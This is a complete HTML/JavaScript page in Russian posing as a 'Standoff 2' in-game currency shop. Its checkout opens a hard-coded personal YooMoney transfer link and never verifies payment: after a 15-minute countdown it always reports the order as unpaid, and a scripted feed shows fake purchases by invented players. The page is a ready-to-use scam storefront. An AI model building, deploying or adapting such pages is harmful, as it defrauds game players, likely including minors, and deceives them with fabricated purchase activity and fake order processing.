<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STANDOFF 2 | LUXURY SHOP</title>
    <style>
        :root { --accent: #ff8c00; --bg: #0d0d0f; --card: rgba(26, 27, 30, 0.98); --success: #00c853; --danger: #ff4444; }
        
        body { 
            background-color: #000;
            background-image: url('https://w.forfun.com');
            background-repeat: no-repeat; background-position: center center;
            background-attachment: fixed; background-size: cover;
            color: white; font-family: -apple-system, system-ui, sans-serif; 
            margin: 0; padding-bottom: 100px; overflow: hidden;
        }

        body::before { content: ""; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: -1; }

        .header { text-align: center; padding: 15px; border-bottom: 2px solid var(--accent); background: rgba(17, 17, 17, 0.9); backdrop-filter: blur(15px); }
        .header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }

        .tabs { display: flex; justify-content: center; gap: 5px; margin: 10px 0; padding: 0 10px; }
        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; transition: 0.3s; }
        .tab-btn.active { border-color: var(--accent); color: white; background: rgba(255, 140, 0, 0.2); }

        .container { max-width: 450px; margin: 0 auto; padding: 0 10px; height: 60vh; overflow-y: auto; scrollbar-width: none; }
        .container::-webkit-scrollbar { display: none; }
        
        .user-input-box { background: var(--card); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1); }
        input { width: 100%; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid #333; color: white; border-radius: 6px; box-sizing: border-box; outline: none; margin-bottom: 8px; font-size: 0.8rem; }

        .services { display: none; grid-template-columns: 1fr; gap: 8px; }
        .services.active { display: grid; }
        
        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; position: relative; transition: 0.2s; }
        .price { color: var(--accent); font-weight: 800; font-size: 1rem; }

        /* ТРЯСКА КОРЗИНЫ */
        .shake { animation: shakeAnim 0.4s ease-in-out; }
        @keyframes shakeAnim {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.2) rotate(15deg); }
            50% { transform: scale(1.2) rotate(-15deg); }
            75% { transform: scale(1.2) rotate(10deg); }
        }

        .fly-text { position: absolute; color: var(--success); font-weight: bold; font-size: 0.9rem; pointer-events: none; z-index: 5000; animation: flyUp 0.8s ease-out forwards; }
        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-50px); } }

        .live-feed { position: fixed; bottom: 90px; left: 15px; width: 180px; z-index: 1000; pointer-events: none; }
        .feed-item { background: rgba(10, 10, 15, 0.98); border-left: 3px solid var(--accent); padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; margin-top: 5px; display: flex; align-items: center; justify-content: space-between; opacity: 0; transform: translateX(-20px); transition: 0.4s; }
        .feed-item.show { opacity: 1; transform: translateX(0); }

        .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; transition: 0.2s; }
        
        #cart-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; display: none; backdrop-filter: blur(10px); }
        .cart-content { max-width: 380px; margin: 30px auto; background: #16171a; border-radius: 20px; padding: 20px; border: 1px solid #333; position: relative; min-height: 400px; display: flex; flex-direction: column; }
        
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-left-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .pay-btn { width: 100%; background: white; color: black; border: none; padding: 14px; border-radius: 10px; font-weight: bold; margin-top: auto; cursor: pointer; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .locked-info { text-align: center; padding: 30px 10px; background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px dashed var(--danger); margin-top: 10px; }
    </style>
</head>
<body>

<div class="cart-toggle" id="cart-icon" onclick="toggleCart()">🛒 <span id="cart-count">0</span></div>
<div class="header"><h1>STANDOFF 2 LUXURY SHOP</h1></div>

<div class="container">
    <div class="tabs">
        <div class="tab-btn active" onclick="switchTab(this, 'gold')">Gold</div>
        <div class="tab-btn" onclick="switchTab(this, 'tickets')">Билеты</div>
        <div class="tab-btn" onclick="switchTab(this, 'pass')">Season Pass</div>
    </div>

    <div class="user-input-box">
        <input type="number" id="user_id" placeholder="ID Игрока">
        <div style="display:flex; gap:5px;">
            <input type="text" id="promo_input" placeholder="Промокод">
            <button onclick="applyPromo()" style="background:var(--accent); border:none; padding:0 12px; border-radius:6px; font-weight:bold; cursor:pointer;">OK</button>
        </div>
        <div id="active-promos" style="font-size: 0.6rem; color: var(--success); margin-top: 4px;"></div>
    </div>

    <div id="gold" class="services active">
        <div class="option" onclick="addToCart(event, '100 Gold', 89)"><h3>100 Gold</h3><div class="price">89 ₽</div></div>
        <div class="option" onclick="addToCart(event, '500 Gold', 379)"><h3>500 Gold</h3><div class="price">379 ₽</div></div>
        <div class="option" onclick="addToCart(event, '1000 Gold', 729)"><h3>1000 Gold</h3><div class="price">729 ₽</div></div>
        <div class="option" onclick="addToCart(event, '3000 Gold', 1599)"><h3>3000 Gold</h3><div class="price">1599 ₽</div></div>
    </div>

    <div id="tickets" class="services">
        <div class="option" onclick="addToCart(event, '100 Билетов', 89)"><h3>100 Билетов</h3><div class="price">89 ₽</div></div>
        <div class="option" onclick="addToCart(event, '500 Билетов', 369)"><h3>500 Билетов</h3><div class="price">369 ₽</div></div>
    </div>

    <div id="pass" class="services"><div class="locked-info"><h2 style="color:var(--danger);font-size:0.9rem">РАЗДЕЛ ЗАКРЫТ</h2><p style="font-size:0.7rem;color:#888">Технические работы.</p></div></div>
</div>

<div id="cart-modal">
    <div class="cart-content">
        <div id="step-cart">
            <h3 style="margin:0 0 15px">Корзина</h3>
            <div id="cart-list" style="max-height:180px; overflow-y:auto; margin-bottom:15px; font-size:0.8rem;"></div>
            <div style="border-top:1px solid #333; padding-top:10px; display:flex; justify-content:space-between; margin-bottom:20px;">
                <span>Итого:</span><b id="total-price" style="color:var(--accent)">0 ₽</b>
            </div>
            <button class="pay-btn" onclick="goToPay()">ОПЛАТИТЬ ПО СБП <img src="https://upload.wikimedia.org" width="25" style="filter:brightness(0)"></button>
            <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; cursor:pointer; font-size:0.7rem;">Закрыть</button>
        </div>
        <div id="step-waiting" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
            <div class="loader"></div>
            <h2 id="timer-text" style="color:var(--accent); font-size:1.5rem;">15:00</h2>
            <p style="color:#888; font-size:0.8rem;">Ожидание транзакции...</p>
        </div>
        <div id="step-error" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
            <div style="font-size: 40px; margin-bottom: 10px;">⚠️</div>
            <h2 style="color:var(--danger); font-size:1rem;">ТОВАР НЕ ОПЛАЧЕН</h2>
            <button class="pay-btn" onclick="location.reload()" style="margin-top:15px;">В МЕНЮ</button>
        </div>
    </div>
</div>

<div class="live-feed" id="live-feed"></div>

<script>
    let cart = [];
    let discount = 0;
    // ТВОЯ ПРЯМАЯ ССЫЛКА
    const yoomoneyUrl = "https://yoomoney.ru/to/4100119062204820";

    function roundToNine(num) {
        return num <= 0 ? 0 : Math.floor(num / 10) * 10 + 9;
    }

    function switchTab(btn, id) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.services').forEach(s => s.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(id).classList.add('active');
    }

    function addToCart(event, name, price) {
        if(!document.getElementById('user_id').value) return alert("Введите ID!");
        
        const icon = document.getElementById('cart-icon');
        icon.classList.remove('shake');
        void icon.offsetWidth;
        icon.classList.add('shake');

        const fly = document.createElement('div');
        fly.className = 'fly-text';
        fly.innerText = '+1 в корзину';
        fly.style.left = event.clientX + 'px';
        fly.style.top = event.clientY + 'px';
        document.body.appendChild(fly);
        setTimeout(() => fly.remove(), 800);

        cart.push({name, price});
        updateCart();
    }

    function updateCart() {
        document.getElementById('cart-count').innerText = cart.length;
        const list = document.getElementById('cart-list');
        list.innerHTML = cart.map(i => `<div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>${i.name}</span><b>${roundToNine(i.price)} ₽</b></div>`).join('');
        let total = cart.reduce((s, i) => s + i.price, 0);
        if(discount) total *= (1 - discount);
        document.getElementById('total-price').innerText = roundToNine(total) + " ₽";
    }

    function applyPromo() {
        const val = document.getElementById('promo_input').value.toUpperCase();
        if(val === 'LUXURY') {
            discount = 0.15;
            document.getElementById('active-promos').innerText = "Промокод LUXURY применен (-15%)";
            updateCart();
        } else { alert("Неверный промокод"); }
    }

    function toggleCart() {
        const m = document.getElementById('cart-modal');
        m.style.display = m.style.display === 'block' ? 'none' : 'block';
    }

    function goToPay() {
        if(cart.length === 0) return;
        
        // РЕДИРЕКТ ПО ТВОЕЙ ССЫЛКЕ
        window.open(yoomoneyUrl, '_blank');
        
        document.getElementById('step-cart').style.display = 'none';
        document.getElementById('step-waiting').style.display = 'flex';
        
        let t = 900;
        const interval = setInterval(() => {
            let m = Math.floor(t / 60), s = t % 60;
            document.getElementById('timer-text').innerText = `${m < 10 ? '0'+m:m}:${s < 10 ? '0'+s:s}`;
            if(--t < 0) { 
                clearInterval(interval); 
                document.getElementById('step-waiting').style.display = 'none'; 
                document.getElementById('step-error').style.display = 'flex'; 
            }
        }, 1000);
    }

    setInterval(() => {
        const feed = document.getElementById('live-feed');
        const names = ["Killer", "Admin", "Mortal", "Sashok", "Vortex", "Legenda"];
        const el = document.createElement('div');
        el.className = 'feed-item';
        el.innerHTML = `<span><b>${names[Math.floor(Math.random()*names.length)]}</b> купил Gold</span> <span style="color:var(--success)">✔</span>`;
        feed.appendChild(el);
        setTimeout(() => el.classList.add('show'), 100);
        setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 500); }, 2000);
    }, 4500);
</script>

</body>
</html>
